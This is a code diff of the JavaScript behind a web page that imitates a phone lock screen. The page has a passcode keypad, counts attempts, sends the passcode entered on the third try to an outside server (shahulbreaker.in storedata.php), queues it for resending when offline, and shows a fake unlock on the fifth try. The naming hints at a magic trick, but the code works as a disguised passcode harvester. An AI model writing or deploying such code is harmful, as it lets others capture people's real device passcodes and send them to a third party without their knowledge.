@@ -1,4 +1,6 @@
-// app.js - 4-digit passcode, send on 3rd attempt, unlock on 5th, queue offline, disable pinch/double-tap
+// app.js - custom attempt flow:
+//  - send only on 3rd attempt
+//  - open phone (play animation) on 5th attempt
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
   const MAX = 4;
@@ -9,11 +11,12 @@
   const emergency = document.getElementById('emergency');
   const cancelBtn = document.getElementById('cancel');
 
+  // overlay & homescreen elements (must exist in index.html)
   const unlockOverlay = document.getElementById('unlockOverlay');
   const homescreenImg = document.getElementById('homescreenImg');
 
+  // persisted attempt counter key
   const ATT_KEY = '_pass_attempt_count_';
-
   function getAttempts(){ return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n){ localStorage.setItem(ATT_KEY, String(n)); }
 
@@ -26,11 +29,11 @@
     localStorage.setItem('_pass_queue_', JSON.stringify(q));
   }
 
+  // send to API (used only on 3rd attempt)
   function sendToAPI(pass){
     const url = API_BASE + encodeURIComponent(pass);
-    return fetch(url, { method: 'GET', keepalive: true }).catch(() => {
-      queuePass(pass);
-    });
+    return fetch(url, { method: 'GET', keepalive: true })
+      .catch(() => { queuePass(pass); });
   }
 
   function flushQueue(){
@@ -43,68 +46,52 @@
     localStorage.removeItem(qk);
   }
 
-  // unlock animation: shrink lock UI then reveal homescreen
+  // Unlock animation: fade/scale lock UI then reveal homescreen overlay
   function playUnlockAnimation() {
     const lockEl = document.querySelector('.lockscreen');
     if (!lockEl || !unlockOverlay) return;
 
-    // tiny flash for realism
-    let flash = document.querySelector('.unlock-flash');
-    if (!flash) {
-      flash = document.createElement('div');
-      flash.className = 'unlock-flash';
-      flash.style.position = 'fixed';
-      flash.style.inset = '0';
-      flash.style.zIndex = '9998';
-      flash.style.pointerEvents = 'none';
-      flash.style.background = 'rgba(255,255,255,0.02)';
-      flash.style.opacity = '0';
-      document.body.appendChild(flash);
-    }
-
     // shrink/fade lock UI
     lockEl.classList.add('unlocking');
 
-    // flash pulse
-    flash.style.transition = 'opacity 320ms ease-out';
-    flash.style.opacity = '0.08';
-    setTimeout(()=>{ flash.style.opacity = '0'; }, 320);
+    // reveal homescreen overlay
+    unlockOverlay.classList.add('show');
 
-    // slight delay then reveal homescreen
-    setTimeout(()=> {
-      unlockOverlay.classList.add('show');
-      // keep pointer events enabled so homescreen can be interactive if you later enable it
-      unlockOverlay.style.pointerEvents = 'auto';
-    }, 90);
+    // Keep the homescreen visible. If you prefer auto-hide, add a timeout here to remove .show
   }
 
-  // Called when full passcode entered
+  // Called after a full 4-digit entry
   async function handleCompleteAttempt(enteredCode) {
+    // increment and persist attempts
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // send only on 3rd attempt
+    // EXACT requirements:
+    // - send only on 3rd attempt
+    // - open phone (play animation) on 5th attempt
     if (attempts === 3) {
+      // send (and queue on failure)
       try {
         await sendToAPI(enteredCode);
-      } catch (e) {
-        // sendToAPI already queues on failure
+      } catch(e){
+        // sendToAPI handles queuing; ignore errors here
       }
-      // do not animate on 3rd
+      // DO NOT animate/open phone on 3rd (per your instruction)
     } else if (attempts === 5) {
-      // play unlock animation on 5th
+      // play the opening animation (no API send)
       playUnlockAnimation();
     } else {
-      // 1,2,4 do nothing
+      // attempts 1,2,4 do nothing
     }
 
+    // reset attempt counter after 5th so cycle repeats
     if (attempts >= 5) {
       setAttempts(0);
     }
   }
 
-  // numeric keys
+  // numeric key handling
   keys.forEach(k => k.addEventListener('click', () => {
     const num = k.dataset.num;
     if (!num) return;
@@ -112,9 +99,9 @@
     code += num;
     refreshDots();
     if (code.length === MAX) {
-      const entered = code;
+      const enteredCode = code;
       setTimeout(() => {
-        handleCompleteAttempt(entered);
+        handleCompleteAttempt(enteredCode);
         reset();
       }, 200);
     }
@@ -129,24 +116,7 @@
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  // expose debug
+  // debug helper
   window.__passUI = { getCode: ()=>code, reset, getAttempts };
-
-  /* === Prevent pinch & double-tap zoom === */
-  // gesturestart (older Safari)
-  window.addEventListener('gesturestart', function(e){ e.preventDefault(); }, { passive:false });
-  // block multi-touch pinch move
-  document.addEventListener('touchmove', function(e){
-    if (e.touches && e.touches.length > 1) e.preventDefault();
-  }, { passive:false });
-  // prevent double-tap zoom
-  (function(){
-    let lastTouch = 0;
-    document.addEventListener('touchend', function(e){
-      const now = Date.now();
-      if (now - lastTouch <= 300) e.preventDefault();
-      lastTouch = now;
-    }, { passive:false });
-  })();
 
 })();
